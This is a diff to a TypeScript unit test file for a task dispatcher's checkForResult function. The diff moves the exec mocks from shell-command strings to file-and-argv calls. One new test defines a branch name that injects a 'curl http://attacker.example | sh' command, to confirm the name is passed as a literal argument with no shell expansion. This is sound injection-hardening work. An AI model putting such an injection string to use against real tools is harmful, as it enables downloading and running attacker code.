@@ -4,7 +4,8 @@ import {
   buildResultFromVerification,
   enrichResultForResumedTask,
   checkForResult,
-  type CheckForResultExec,
+  type CheckForResultExecFile,
+  type CheckForResultReadFile,
 } from '../../../services/task-dispatcher/webhook-callbacks.js';
 import type { Task, TaskResult } from '../../../types/task.js';
 import type { CreateTaskRequest } from '../../../types/api.js';
@@ -662,41 +663,57 @@ describe('enrichResultForResumedTask', () => {
 });
 
 describe('checkForResult', () => {
+  type ExecMatcher = (file: string, args: readonly string[]) => boolean;
   function makeExec(
-    responses: Record<string, { stdout: string } | Error>
-  ): CheckForResultExec & { calls: string[] } {
-    const calls: string[] = [];
-    const fn: CheckForResultExec = async (command) => {
-      calls.push(command);
-      for (const [match, response] of Object.entries(responses)) {
-        if (command.includes(match)) {
+    responses: Array<[ExecMatcher, { stdout: string } | Error]>
+  ): CheckForResultExecFile & { calls: { file: string; args: readonly string[] }[] } {
+    const calls: { file: string; args: readonly string[] }[] = [];
+    const fn: CheckForResultExecFile = async (file, args) => {
+      calls.push({ file, args });
+      for (const [match, response] of responses) {
+        if (match(file, args)) {
           if (response instanceof Error) throw response;
           return response;
         }
       }
-      throw new Error(`Unexpected exec command: ${command}`);
+      throw new Error(`Unexpected exec command: ${file} ${args.join(' ')}`);
     };
     return Object.assign(fn, { calls });
   }
 
+  function makeRead(content: string | Error): CheckForResultReadFile {
+    return async (): Promise<string> => {
+      if (content instanceof Error) throw content;
+      return content;
+    };
+  }
+
+  const isGhPrView = (n: number): ExecMatcher => (file, args) =>
+    file === 'gh' && args[0] === 'pr' && args[1] === 'view' && args[2] === String(n);
+  const isGhPrList: ExecMatcher = (file, args) =>
+    file === 'gh' && args[0] === 'pr' && args[1] === 'list';
+  const isGitBranchShowCurrent: ExecMatcher = (file, args) =>
+    file === 'git' && args[0] === 'branch' && args[1] === '--show-current';
+
   it('returns a TaskResult built from continuation PR data when the PR is OPEN and not merged', async () => {
     const task = makeTask({ continuationPrNumber: 42 });
-    const exec = makeExec({
-      'gh pr view 42': {
-        stdout: JSON.stringify({
-          url: 'https://github.com/pr/42',
-          number: 42,
-          headRefName: 'feature/int-1425',
-          title: 'Nitpick fixes',
-          state: 'OPEN',
-          mergedAt: null,
-        }),
-      },
-      '.rebase-result.json': {
-        stdout: '{"attempted":true,"success":true,"conflictFiles":[]}',
-      },
-    });
-    const result = await checkForResult(mockLogger as never, task, exec);
+    const exec = makeExec([
+      [
+        isGhPrView(42),
+        {
+          stdout: JSON.stringify({
+            url: 'https://github.com/pr/42',
+            number: 42,
+            headRefName: 'feature/int-1425',
+            title: 'Nitpick fixes',
+            state: 'OPEN',
+            mergedAt: null,
+          }),
+        },
+      ],
+    ]);
+    const read = makeRead('{"attempted":true,"success":true,"conflictFiles":[]}');
+    const result = await checkForResult(mockLogger as never, task, exec, read);
     expect(result).toEqual({
       branch: 'feature/int-1425',
       prUrl: 'https://github.com/pr/42',
@@ -707,67 +724,76 @@ describe('checkForResult', () => {
 
   it('treats an absent mergedAt field as not-merged', async () => {
     const task = makeTask({ continuationPrNumber: 7 });
-    const exec = makeExec({
-      'gh pr view 7': {
-        stdout: JSON.stringify({
-          url: 'https://github.com/pr/7',
-          number: 7,
-          headRefName: 'feature/int-1425',
-          title: 'No mergedAt field',
-          state: 'OPEN',
-          // mergedAt omitted entirely -> undefined branch
-        }),
-      },
-      '.rebase-result.json': { stdout: '{}' },
-    });
-    const result = await checkForResult(mockLogger as never, task, exec);
+    const exec = makeExec([
+      [
+        isGhPrView(7),
+        {
+          stdout: JSON.stringify({
+            url: 'https://github.com/pr/7',
+            number: 7,
+            headRefName: 'feature/int-1425',
+            title: 'No mergedAt field',
+            state: 'OPEN',
+            // mergedAt omitted entirely -> undefined branch
+          }),
+        },
+      ],
+    ]);
+    const read = makeRead('{}');
+    const result = await checkForResult(mockLogger as never, task, exec, read);
     expect(result?.prUrl).toBe('https://github.com/pr/7');
     expect(result?.rebaseResult).toBeUndefined();
   });
 
   it('returns undefined when the continuation PR is merged', async () => {
     const task = makeTask({ continuationPrNumber: 42 });
-    const exec = makeExec({
-      'gh pr view 42': {
-        stdout: JSON.stringify({
-          url: 'https://github.com/pr/42',
-          number: 42,
-          headRefName: 'feature/int-1425',
-          title: 'Nitpick fixes',
-          state: 'MERGED',
-          mergedAt: '2026-04-22T00:00:00Z',
-        }),
-      },
-    });
-    expect(await checkForResult(mockLogger as never, task, exec)).toBeUndefined();
+    const exec = makeExec([
+      [
+        isGhPrView(42),
+        {
+          stdout: JSON.stringify({
+            url: 'https://github.com/pr/42',
+            number: 42,
+            headRefName: 'feature/int-1425',
+            title: 'Nitpick fixes',
+            state: 'MERGED',
+            mergedAt: '2026-04-22T00:00:00Z',
+          }),
+        },
+      ],
+    ]);
+    const read = makeRead('{}');
+    expect(await checkForResult(mockLogger as never, task, exec, read)).toBeUndefined();
   });
 
   it('returns undefined when the continuation PR parse fails (invalid JSON)', async () => {
     const task = makeTask({ continuationPrNumber: 42 });
-    const exec = makeExec({
-      'gh pr view 42': { stdout: '{not-json' },
-    });
-    expect(await checkForResult(mockLogger as never, task, exec)).toBeUndefined();
+    const exec = makeExec([[isGhPrView(42), { stdout: '{not-json' }]]);
+    const read = makeRead('{}');
+    expect(await checkForResult(mockLogger as never, task, exec, read)).toBeUndefined();
   });
 
   it('resolves branch/PR info from gh pr list when no continuationPrNumber is set', async () => {
     const task = makeTask();
-    const exec = makeExec({
-      'git branch --show-current': { stdout: 'feature/int-1425\n' },
-      'gh pr list': {
-        stdout: JSON.stringify([
-          {
-            url: 'https://github.com/pr/99',
-            number: 99,
-            headRefName: 'feature/int-1425',
-            title: 'branch-driven result',
-            commits: [{ oid: 'abc', messageHeadline: 'init' }],
-          },
-        ]),
-      },
-      '.rebase-result.json': { stdout: '{}' },
-    });
-    const result = await checkForResult(mockLogger as never, task, exec);
+    const exec = makeExec([
+      [isGitBranchShowCurrent, { stdout: 'feature/int-1425\n' }],
+      [
+        isGhPrList,
+        {
+          stdout: JSON.stringify([
+            {
+              url: 'https://github.com/pr/99',
+              number: 99,
+              headRefName: 'feature/int-1425',
+              title: 'branch-driven result',
+              commits: [{ oid: 'abc', messageHeadline: 'init' }],
+            },
+          ]),
+        },
+      ],
+    ]);
+    const read = makeRead('{}');
+    const result = await checkForResult(mockLogger as never, task, exec, read);
     expect(result?.prUrl).toBe('https://github.com/pr/99');
     expect(result?.branch).toBe('feature/int-1425');
     expect(result?.commits).toBe(1);
@@ -775,22 +801,95 @@ describe('checkForResult', () => {
 
   it('returns undefined when gh pr list yields no PRs', async () => {
     const task = makeTask();
-    const exec = makeExec({
-      'git branch --show-current': { stdout: 'feature/int-1425\n' },
-      'gh pr list': { stdout: '[]' },
-    });
-    expect(await checkForResult(mockLogger as never, task, exec)).toBeUndefined();
+    const exec = makeExec([
+      [isGitBranchShowCurrent, { stdout: 'feature/int-1425\n' }],
+      [isGhPrList, { stdout: '[]' }],
+    ]);
+    const read = makeRead('{}');
+    expect(await checkForResult(mockLogger as never, task, exec, read)).toBeUndefined();
   });
 
   it('swallows exec errors and logs them', async () => {
     const task = makeTask();
-    const exec = makeExec({
-      'git branch --show-current': new Error('not a git repo'),
-    });
-    expect(await checkForResult(mockLogger as never, task, exec)).toBeUndefined();
+    const exec = makeExec([[isGitBranchShowCurrent, new Error('not a git repo')]]);
+    const read = makeRead('{}');
+    expect(await checkForResult(mockLogger as never, task, exec, read)).toBeUndefined();
     expect(mockLogger.error).toHaveBeenCalledWith(
       expect.objectContaining({ taskId: 'task-1' }),
       'Failed to check for task result'
     );
+  });
+
+  it('passes attacker-controlled branch name as literal argv to gh pr list (no shell expansion)', async () => {
+    const evilBranch = '"; curl http://attacker.example | sh; echo "';
+    const task = makeTask();
+    const exec = makeExec([
+      [isGitBranchShowCurrent, { stdout: `${evilBranch}\n` }],
+      [isGhPrList, { stdout: '[]' }],
+    ]);
+    const read = makeRead('{}');
+    await checkForResult(mockLogger as never, task, exec, read);
+
+    const ghCall = exec.calls.find((c) => c.file === 'gh' && c.args[0] === 'pr' && c.args[1] === 'list');
+    expect(ghCall).toBeDefined();
+    // The malicious branch must be a literal element in argv, never concatenated into one string.
+    expect(ghCall?.args).toEqual([
+      'pr',
+      'list',
+      '--head',
+      evilBranch,
+      '--json',
+      'url,number,headRefName,title,commits',
+      '--jq',
+      '.',
+    ]);
+  });
+
+  it('returns rebase result undefined when readRebaseFile throws (continuation PR path)', async () => {
+    const task = makeTask({ continuationPrNumber: 42 });
+    const exec = makeExec([
+      [
+        isGhPrView(42),
+        {
+          stdout: JSON.stringify({
+            url: 'https://github.com/pr/42',
+            number: 42,
+            headRefName: 'feature/int-1425',
+            title: 'Nitpick fixes',
+            state: 'OPEN',
+            mergedAt: null,
+          }),
+        },
+      ],
+    ]);
+    const read = makeRead(new Error('ENOENT'));
+    const result = await checkForResult(mockLogger as never, task, exec, read);
+    expect(result?.prUrl).toBe('https://github.com/pr/42');
+    expect(result?.rebaseResult).toBeUndefined();
+  });
+
+  it('returns rebase result undefined when readRebaseFile throws (gh pr list path)', async () => {
+    const task = makeTask();
+    const exec = makeExec([
+      [isGitBranchShowCurrent, { stdout: 'feature/int-1425\n' }],
+      [
+        isGhPrList,
+        {
+          stdout: JSON.stringify([
+            {
+              url: 'https://github.com/pr/99',
+              number: 99,
+              headRefName: 'feature/int-1425',
+              title: 'branch-driven result',
+              commits: [{ oid: 'abc', messageHeadline: 'init' }],
+            },
+          ]),
+        },
+      ],
+    ]);
+    const read = makeRead(new Error('ENOENT'));
+    const result = await checkForResult(mockLogger as never, task, exec, read);
+    expect(result?.prUrl).toBe('https://github.com/pr/99');
+    expect(result?.rebaseResult).toBeUndefined();
   });
 });
